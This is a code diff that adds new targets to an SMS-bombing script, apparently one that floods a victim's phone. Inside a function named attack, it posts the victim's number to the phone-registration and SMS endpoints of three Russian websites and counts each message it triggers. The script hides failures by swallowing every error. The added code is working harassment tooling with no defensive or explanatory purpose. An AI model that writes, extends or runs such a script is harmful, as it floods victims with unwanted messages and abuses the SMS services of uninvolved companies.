@@ -238,4 +238,28 @@ def attack(number, sms):
             check(sent, sms)
         except:
             pass
+        
+         try:
+            requests.post('https://ggbet.ru/api/auth/register-with-phone', data={"phone": number_plus7, "login": "ivan@gmail.com", "password": "Qwasz123", "agreement": "true", "oferta": "true", "oferta": "true"}, headers=HEADERS)
+            sent += 1
+            time(sent)
+            check(sent, sms)
+        except:
+            pass
+
+        try:
+            requests.post('https://www.etm.ru/cat/runprog.html', data={"mode": "sendSms", "syf_prog": "clients-services", "getSysParam": "yes", "m_phone": number, "param": ""}, headers=HEADERS)
+            sent += 1
+            time(sent)
+            check(sent, sms)
+        except:
+            pass
+
+        try:
+            requests.post('https://mousam.ru/newapi/checkphone.json', data={"phone": number_7}, headers=HEADERS)
+            sent += 1
+            time(sent)
+            check(sent, sms)
+        except:
+            pass
 
